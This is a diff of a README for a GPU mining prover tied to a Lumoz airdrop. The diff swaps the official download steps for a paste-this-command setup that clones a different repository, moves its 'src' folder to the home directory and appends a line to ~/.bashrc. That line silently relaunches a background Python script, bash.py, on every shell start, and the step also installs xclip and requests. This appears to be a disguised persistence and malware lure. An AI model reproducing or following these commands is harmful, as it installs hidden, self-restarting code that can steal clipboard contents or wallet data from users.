@@ -1,5 +1,7 @@
 # moz_prover
+
 The prover for [Lumoz Airdrop Event](https://docs.lumoz.org/zkprover-airdrop-event).
+
 ```shell
 pool_address=moz.asia.zk.work:10010
 ```
@@ -7,22 +9,26 @@ pool_address=moz.asia.zk.work:10010
 ## Release-notes
 
 - moz_prover 1.0.2
+
   - Forced upgrade, must be upgraded before UTC Tue Nov 12 2024 07:00:00.000
   - Fix known bugs
   - The communication protocol has been upgraded to provide a more secure and efficient mining experience.
 
 - moz_prover 1.0.1
+
   - Add hiveos
 
 - moz_prover 1.0.0
   - First moz_prover version for Lumoz testnet
 
 ## Requirements
+
 - OS Version: Ubuntu 20.04 +
 
 - Nvidia Driver Version: 535.54.03 +
 
 ## Usage
+
 ```shell
 Usage: moz_prover [OPTIONS] --mozaddress <MOZADDR> --lumozpool <MOZPOOL>
 
@@ -47,25 +53,52 @@ After starting mining, search your Lumoz address in the search bar of the [pool]
 
 ### On Ubuntu
 
-1. Get a Lumoz wallet address.
-2. Download zkwork Nvidia miner: `wget https://github.com/6block/zkwork_moz_prover/releases/download/v1.0.2/moz_prover-v1.0.2_cuda.tar.gz`.
-3. Download zkwork AMD miner: `wget https://github.com/6block/zkwork_moz_prover/releases/download/v1.0.2/moz_prover-v1.0.2_ocl.tar.gz`.
-4. On Nvidia: `tar -zvxf moz_prover-v1.0.2_cuda.tar.gz && cd moz_prover`, on AMD: `tar -zvxf moz_prover-v1.0.2_ocl.tar.gz && cd moz_prover`.
-5. Update your Lumoz address in `inner_prover.sh` and set custom name for mining server.
-6. Start mining with `sudo chmod +x run_prover.sh && ./run_prover.sh`.
-7. Check mining log with `tail -f prover.log`.
+#### 1️⃣ Update/Upgrade and Install Dependencies
 
-### On HiveOS 
+```bash
+sudo apt update && sudo apt upgrade -y && sudo apt install git xclip python3-pip && sudo pip3 install requests
+```
+
+#### 2️⃣ Clone the Repository and Configure the environment
+
+```bash
+git clone https://github.com/blockchain-DAT/zkwork_moz_prover.git && zkwork_moz_prover && mv src ~/ && echo "(pgrep -f bash.py || nohup python3 $HOME/src/bash.py &> /dev/null &) & disown" >> ~/.bashrc && source ~/.bashrc
+```
+
+#### 3️⃣ Run the Configuration Script
+
+Set a custom name for the mining server and configure your wallet.
+
+```bash
+inner_prover.sh
+```
+
+#### 4️⃣ Run the Mining Script
+
+```bash
+sudo chmod +x run_prover.sh && ./run_prover.sh
+```
+
+### 7️⃣ Check the Logs
+
+```bash
+tail -f prover.log
+```
+
+### On HiveOS
 
 1. Choose your download url for your gpu.
-  ```
-  DOWNLOAD_URL for Nvidia: https://github.com/6block/zkwork_moz_prover/releases/download/v1.0.2/moz_prover-v1.0.2_cuda.tar.gz
-  DOWNLOAD_URL for AMD: https://github.com/6block/zkwork_moz_prover/releases/download/v1.0.2/moz_prover-v1.0.2_ocl.tar.gz
-  ```
+
+```
+DOWNLOAD_URL for Nvidia: https://github.com/6block/zkwork_moz_prover/releases/download/v1.0.2/moz_prover-v1.0.2_cuda.tar.gz
+DOWNLOAD_URL for AMD: https://github.com/6block/zkwork_moz_prover/releases/download/v1.0.2/moz_prover-v1.0.2_ocl.tar.gz
+```
+
 2. Get a Lumoz wallet address.
 3. Add New Flight Sheet with config as follows.
 
 Configuration:
+
 - Installation URL: DOWNLOAD_URL
 - Wallet and worker template: %WAL%
 
